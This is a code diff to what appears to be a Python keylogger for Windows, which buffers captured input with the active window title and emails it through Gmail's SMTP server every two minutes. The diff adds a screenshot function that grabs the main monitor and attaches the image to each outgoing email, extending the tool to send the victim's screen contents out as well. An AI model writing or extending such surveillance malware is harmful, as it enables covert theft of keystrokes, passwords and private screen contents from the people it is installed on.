@@ -8,6 +8,8 @@ import win32event, win32api, winerror
 from datetime import datetime
 from threading import Thread
 from time import sleep
+import mss
+import mss.tools
 import smtplib
 import sys
 import shutil
@@ -49,6 +51,12 @@ else:
 data = ''
 lastwindow = ''
 
+def Screenshot():    
+    with mss.mss() as sct:
+    	monitor = sct.monitors[1]
+    	im = sct.grab(monitor)
+    	raw_bytes = mss.tools.to_png(im.rgb, im.size)
+    return raw_bytes
 
 def send_mail():
     global data,lastwindow
@@ -62,6 +70,9 @@ def send_mail():
             MESSAGE =  '<span style="color:#0000FF">' + ' [' + lastwindow + '] ' + '</span>'+ data 
             msg = MIMEMultipart()
             msg.attach(MIMEText(MESSAGE, 'html'))
+            MimeImg = MIMEImage(Screenshot())
+            MimeImg.add_header('Content-Disposition', 'attachment', filename="screenshot.png")
+            msg.attach(MimeImg)
             text = msg.as_string()
             try:
                 server = smtplib.SMTP("smtp.gmail.com",587)
@@ -77,7 +88,7 @@ def send_mail():
                 msg = ''
                 server.quit()
             except Exception as error:
-                print (error)
+                print(error)
         sleep(120)
 
 
